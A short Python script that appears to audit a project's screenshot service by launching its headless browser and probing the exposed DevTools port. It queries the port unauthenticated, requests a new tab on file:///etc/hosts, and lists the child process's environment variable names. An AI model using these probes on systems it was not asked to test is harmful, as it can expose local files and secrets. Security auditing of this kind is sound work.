import sys, os, subprocess, tempfile, time, json, urllib.request
sys.path.insert(0, ".")
from pathlib import Path
from backend.services import goose_screenshot as gs

exe, kind, why = gs.find_browser(os.environ)
print("browser", exe, kind, why)
profile = Path(tempfile.mkdtemp(prefix="goose-shot-"))
port = gs._free_port()
proc = gs._launch(exe, port, profile, os.environ)
try:
    time.sleep(1.5)
    out = subprocess.run(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN", "-a", "-g", str(proc.pid)], capture_output=True, text=True)
    print(out.stdout, out.stderr)
    out = subprocess.run(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN"], capture_output=True, text=True).stdout
    print([l for l in out.splitlines() if str(port) in l])
    # any local process can do this
    print(urllib.request.urlopen(f"http://127.0.0.1:{port}/json/version").read()[:200])
    # new target via PUT (local attacker)
    req = urllib.request.Request(f"http://127.0.0.1:{port}/json/new?file:///etc/hosts", method="PUT")
    try:
        print("PUT /json/new ->", urllib.request.urlopen(req).read()[:200])
    except Exception as e:
        print("PUT /json/new failed", e)
    # child env
    ps = subprocess.run(["ps", "-E", "-p", str(proc.pid)], capture_output=True, text=True).stdout
    print("ENV KEYS:", sorted({t.split("=")[0] for t in ps.split() if "=" in t and t.split("=")[0].isupper()}))
finally:
    gs._kill_group(proc)
